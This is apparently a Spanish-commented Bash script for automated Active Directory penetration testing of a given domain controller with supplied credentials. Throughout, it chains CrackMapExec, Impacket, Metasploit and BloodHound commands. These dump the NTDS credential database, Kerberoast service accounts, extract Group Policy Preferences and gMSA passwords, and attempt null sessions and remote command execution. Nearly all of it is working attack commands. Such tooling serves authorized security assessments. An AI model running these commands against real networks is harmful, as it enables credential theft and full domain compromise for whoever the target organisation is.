#!/bin/bash
while getopts ":t:d:h:u:p:" OPTIONS
do
            case $OPTIONS in
            t)     TARGET=$OPTARG;;
            d)     DOMAIN=$OPTARG;;
            h)     HOSTNAME=$OPTARG;;
            u)     USER=$OPTARG;;
            p)     PASSWORD=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

TARGET=${TARGET:=NULL}
DOMAIN=${DOMAIN:=NULL}
HOSTNAME=${HOSTNAME:=NULL}
USER=${USER:=NULL}
PASSWORD=${PASSWORD:=NULL}

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py 2>/dev/null
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
	mv .banners/* .banners2 2>/dev/null
	}
	
    

if [ "$TARGET" = NULL ] || [ "$DOMAIN" = NULL ]; then

cat << "EOF"

Opciones: 

-t : Target
-d : domain
-u : usuario
-h : DNS host name
-p : password

ADtester.sh -t 192.168.0.1 -d local.test -h server.local.test -u secretario -p 1234
EOF

exit
fi

echo -e "[+] Sincronizar la hora \n"  
rdate -n $TARGET
sleep 1
rdate -n $TARGET
sleep 1
rdate -n $TARGET

arrIN=(${DOMAIN//./ })
DOMAIN1=${arrIN[0]}    
DOMAIN2=${arrIN[1]}    

echo "$TARGET $DOMAIN" >> /etc/hosts
echo "DOMAIN1 $DOMAIN1 DOMAIN2 $DOMAIN2"
#Listar usuarios
echo -e "[+] Listar usuarios \n"  
#docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" --users | tee -a logs/enumeracion/"$TARGET"_ActiveDirectory_users.txt
GetADUsers.py -all $DOMAIN/$USER:"$PASSWORD" -dc-ip $TARGET | tee -a logs/enumeracion/"$TARGET"_ActiveDirectory_users.txt
cat logs/enumeracion/"$TARGET"_ActiveDirectory_users.txt  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .enumeracion/"$TARGET"_ActiveDirectory_users.txt

#Listar grupos
echo -e "[+] Listar grupos \n"  
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" --groups | tee -a logs/enumeracion/"$TARGET"_ActiveDirectory_groups.txt
grep --color=never "membercount" logs/enumeracion/"$TARGET"_ActiveDirectory_groups.txt  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .enumeracion/"$TARGET"_ActiveDirectory_groups.txt

#Listar compartidos
echo -e "[+] Listar recursos compartidos \n"  
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" --shares | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_shares.txt
egrep -ira --color=never "READ|WRITE" logs/vulnerabilidades/"$TARGET"_ActiveDirectory_shares.txt  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$TARGET"_ActiveDirectory_compartidoSMB.txt

#Listar sesiones activas
echo -e "[+] Listar sesiones activas \n"  
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" --sessions | tee -a logs/enumeracion/"$TARGET"_ActiveDirectory_sessions.txt
grep -ira  '\\' logs/enumeracion/"$TARGET"_ActiveDirectory_sessions.txt  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .enumeracion/"$TARGET"_ActiveDirectory_sessions.txt

#Obtener la politica de passwords
echo -e "[+] Listar politica de passwords \n"  
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" --pass-pol | tee -a logs/enumeracion/"$TARGET"_ActiveDirectory_passPol.txt
grep -ira --color=never 'SMB' logs/enumeracion/"$TARGET"_ActiveDirectory_passPol.txt  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .enumeracion/"$TARGET"_ActiveDirectory_passPol.txt

#grep "account lockout threshold"

#Intentar obtener la BD del active
echo -e "[+] Intentar obtener la BD del active directory \n"  
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" --ntds drsuapi | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_drsuapi.txt
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" --ntds vss | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_vss.txt

#Sesion nula
echo -e "[+] Intentar sesion nula \n"  
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u '' -p '' | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_anonymous.txt

#Ejecutar comandos
echo -e "[+] Intentar ejecutar comandos  \n"  
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" -x "ipconfig" | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_command.txt
grep -a "IPv4" logs/vulnerabilidades/"$TARGET"_ActiveDirectory_command.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$TARGET"_ActiveDirectory_command.txt

#Ejecutar comandos
echo -e "[+] Intentar ejecutar comandos (local) \n"   
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" -x "ipconfig" --local-auth | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_commandLocal.txt
grep -a "IPv4" logs/vulnerabilidades/"$TARGET"_ActiveDirectory_commandLocal.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$TARGET"_ActiveDirectory_commandLocal.txt


#Kerberoasting - hashcat -m 13100 -a 0 hash-ad.txt /media/sistemas/Passwords -o cracked.txt
echo -e "[+] Kerberoasting \n"   
GetUserSPNs.py -request -dc-ip $TARGET $DOMAIN/$USER:"$PASSWORD" | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_Kerberoasting.txt
grep -a "krb5tgs" logs/vulnerabilidades/"$TARGET"_ActiveDirectory_Kerberoasting.txt > .vulnerabilidades/"$TARGET"_ActiveDirectory_Kerberoasting.txt

#Credential Dumping: Group Policy Preferences
echo -e "[+] Credential Dumping: Group Policy Preferences \n"   
docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" -M gpp_autologin | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_gppAutologin.txt
grep -a "Found" logs/vulnerabilidades/"$TARGET"_ActiveDirectory_gppAutologin.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | strings | awk '{print $7}' | sort -r | uniq > .vulnerabilidades/"$TARGET"_ActiveDirectory_gppAutologin.txt

docker run  -it byt3bl33d3r/crackmapexec smb $TARGET -u $USER -p "$PASSWORD" -M gpp_password | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_gppPassword.txt
grep -a "Policies" logs/vulnerabilidades/"$TARGET"_ActiveDirectory_gppPassword.txt | strings | awk '{print $7}' | sort | uniq > .vulnerabilidades/"$TARGET"_ActiveDirectory_gppPassword.txt
grep -a "Password" logs/vulnerabilidades/"$TARGET"_ActiveDirectory_gppPassword.txt | strings  | sort -r | uniq >> .vulnerabilidades/"$TARGET"_ActiveDirectory_gppPassword.txt


# numerar usuarios"
echo -e "[+] \t Enumerar usuarios"	
msfconsole -x "use auxiliary/scanner/smb/smb_enumusers;set RHOSTS $TARGET; set SMBDomain $DOMAIN; set SMBUser $USER; set SMBPass $PASSWORD ;run;exit" > logs/enumeracion/"$TARGET"_"$port"_smbEnumusers.txt 2>/dev/null							   
egrep --color=never -i "RID" logs/enumeracion/"$TARGET"_"$port"_smbEnumusers.txt  >> .enumeracion/"$TARGET"_"$port"_smbEnumusers.txt

# Reads any Group Managed Service Accounts (GMSAs) password blobs the user can access and parses the values.
echo -e "[+] \t  Group Managed Service Accounts "	
gMSADumper.py -u $USER -p $PASSWORD -d $DOMAIN | tee -a logs/vulnerabilidades/"$TARGET"_ActiveDirectory_gMSADumper.txt
grep '::' logs/vulnerabilidades/"$TARGET"_ActiveDirectory_gMSADumper.txt > .vulnerabilidades/"$TARGET"_ActiveDirectory_gMSADumper.txt

echo -e "[+] \t  Get servicePrincipalNames"	
ldapsearch -x -h $TARGET -p 389 -D $USER  -w $PASSWORD -b "dc=$DOMAIN1,dc=$DOMAIN2" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.1 13556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName > logs/enumeracion/"$TARGET"_ActiveDirectory_servicePrincipalNames.txt
cat logs/enumeracion/"$TARGET"_ActiveDirectory_servicePrincipalNames.txt > .enumeracion/"$TARGET"_ActiveDirectory_servicePrincipalNames.txt


echo -e "[+] \t Enumerar con bloodhound"	
bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -gc $HOSTNAME -c all -ns $TARGET

echo -e "[+] \t Enumerar con ldapdomaindump"	
ldapdomaindump -u $DOMAIN\\$USER -p $PASSWORD $TARGET



insert_data
